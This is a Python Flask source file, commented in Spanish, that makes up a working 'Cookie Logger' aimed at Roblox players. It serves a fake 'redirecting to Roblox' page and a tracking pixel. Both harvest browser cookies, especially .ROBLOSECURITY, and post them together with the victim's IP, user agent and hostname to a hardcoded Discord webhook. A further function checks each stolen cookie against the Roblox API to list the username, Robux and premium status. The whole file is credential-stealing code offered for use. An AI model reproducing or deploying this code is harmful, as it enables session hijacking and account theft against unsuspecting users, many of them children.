from flask import Flask, request, Response, redirect, jsonify
import requests
import json
from datetime import datetime
import os
import base64
import socket

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def verify_roblox_cookie(cookie):
    """Verifica cookie de Roblox con la API"""
    try:
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie
        response = session.get('https://www.roblox.com/mobileapi/userinfo')
        
        if response.status_code == 200:
            data = response.json()
            return {
                "valid": True,
                "username": data.get('UserName', 'Unknown'),
                "user_id": data.get('UserID', 'Unknown'),
                "robux": data.get('RobuxBalance', 0),
                "premium": data.get('IsPremium', False),
                "avatar": data.get('ThumbnailUrl', 'https://www.roblox.com/asset/?id=123456789')
            }
        else:
            return {"valid": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def send_to_discord(cookies_data, ip, user_agent, hostname="Unknown"):
    """Envía cookies a Discord"""
    try:
        roblox_cookie = cookies_data.get('.ROBLOSECURITY', 'No encontrada')
        
        # Verificar cookie
        user_info = {"valid": False}
        if roblox_cookie != 'No encontrada':
            user_info = verify_roblox_cookie(roblox_cookie)
        
        fields = [
            {"name": "🌐 IP", "value": str(ip), "inline": True},
            {"name": "💻 Hostname", "value": hostname, "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": True},
            {"name": "📅 Fecha/Hora", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
        ]
        
        if roblox_cookie != 'No encontrada':
            fields.append({"name": "🔴 .ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False})
            
            if user_info.get('valid'):
                fields.append({"name": "👤 Username", "value": user_info['username'], "inline": True})
                fields.append({"name": "🆔 User ID", "value": str(user_info['user_id']), "inline": True})
                fields.append({"name": "💰 Robux", "value": str(user_info['robux']), "inline": True})
                fields.append({"name": "⭐ Premium", "value": "✅ Sí" if user_info['premium'] else "❌ No", "inline": True})
                fields.append({"name": "✅ Cookie Válida", "value": "SÍ", "inline": True})
            else:
                fields.append({"name": "❌ Cookie Inválida", "value": user_info.get('error', 'Error'), "inline": True})
        else:
            fields.append({"name": "🔴 .ROBLOSECURITY", "value": "❌ No encontrada", "inline": False})
        
        # Mostrar todas las cookies
        cookies_text = json.dumps(cookies_data, indent=2, ensure_ascii=False)
        if len(cookies_text) > 1000:
            cookies_text = cookies_text[:1000] + "..."
        
        fields.append({"name": "📋 Todas las cookies", "value": f"```json\n{cookies_text}```", "inline": False})
        
        embed = {
            "title": f"🎯 COOKIE LOGGER - {user_info.get('username', 'Desconocido')}",
            "color": 16711680 if user_info.get('valid') else 16776960,
            "thumbnail": {"url": user_info.get('avatar', 'https://www.roblox.com/asset/?id=123456789')},
            "fields": fields,
            "footer": {"text": "Cookie Logger - v2.0"}
        }
        
        payload = {
            "content": "@everyone **🚨 COOKIE DETECTADA**" if roblox_cookie != 'No encontrada' else "@here **⚠️ Intento de captura**",
            "embeds": [embed]
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Enviado a Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    """Página que captura cookies vía JavaScript y headers"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Obtener hostname
    try:
        hostname = socket.gethostname()
    except:
        hostname = "Unknown"
    
    # Capturar cookies de los headers HTTP
    cookie_string = request.headers.get('Cookie', '')
    header_cookies = {}
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                header_cookies[key.strip()] = value.strip()
        
        if header_cookies:
            print(f"Cookies de headers encontradas para {ip}")
            send_to_discord(header_cookies, ip, user_agent, hostname)
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redireccionando...</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
            margin: 0;
        }}
        .loading {{
            text-align: center;
            padding: 20px;
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <h2>Redireccionando a Roblox...</h2>
        <p>Por favor espera un momento.</p>
    </div>
    
    <script>
        // Capturar cookies del navegador
        (function() {{
            function getCookies() {{
                const cookies = document.cookie.split(';');
                const cookieObj = {{}};
                
                cookies.forEach(cookie => {{
                    cookie = cookie.trim();
                    if (cookie) {{
                        const separatorIndex = cookie.indexOf('=');
                        if (separatorIndex > 0) {{
                            const name = cookie.substring(0, separatorIndex);
                            const value = cookie.substring(separatorIndex + 1);
                            cookieObj[name] = decodeURIComponent(value);
                        }}
                    }}
                }});
                
                return cookieObj;
            }}
            
            async function sendData() {{
                const cookies = getCookies();
                
                // Buscar .ROBLOSECURITY
                let robloxCookie = null;
                const variations = [
                    '.ROBLOSECURITY', 'ROBLOSECURITY', '.ROBLOSECURITY_COOKIE',
                    'ROBLOSECURITY_COOKIE', 'robloxsecurity', '.robloxsecurity',
                    'roblox_security', '.roblox_security'
                ];
                
                for (const varName of variations) {{
                    if (cookies[varName]) {{
                        robloxCookie = cookies[varName];
                        break;
                    }}
                }}
                
                try {{
                    const response = await fetch('/capture', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json'
                        }},
                        body: JSON.stringify({{
                            cookies: cookies,
                            roblox_cookie: robloxCookie,
                            hostname: '{hostname}'
                        }})
                    }});
                }} catch(error) {{
                    console.error('Error:', error);
                }}
            }}
            
            sendData();
            
            setTimeout(() => {{
                window.location.href = 'https://www.roblox.com/home';
            }}, 500);
        }})();
    </script>
</body>
</html>"""
    
    return html

@app.route('/capture', methods=['POST'])
def capture():
    """Endpoint para recibir cookies del JavaScript"""
    try:
        data = request.json
        cookies = data.get('cookies', {})
        roblox_cookie = data.get('roblox_cookie')
        hostname = data.get('hostname', 'Unknown')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Si encontramos .ROBLOSECURITY en los datos separados
        if roblox_cookie and '.ROBLOSECURITY' not in cookies:
            cookies['.ROBLOSECURITY'] = roblox_cookie
        
        print(f"Cookies JS recibidas de {ip}: {len(cookies)} cookies")
        
        if cookies:
            send_to_discord(cookies, ip, user_agent, hostname)
        
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/pixel.png')
def pixel():
    """Endpoint para pixel tracker"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Obtener hostname
    try:
        hostname = socket.gethostname()
    except:
        hostname = "Unknown"
    
    # Capturar cookies de los headers
    cookie_string = request.headers.get('Cookie', '')
    cookies = {}
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        if cookies:
            print(f"Cookies pixel de {ip}")
            send_to_discord(cookies, ip, user_agent, hostname)
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
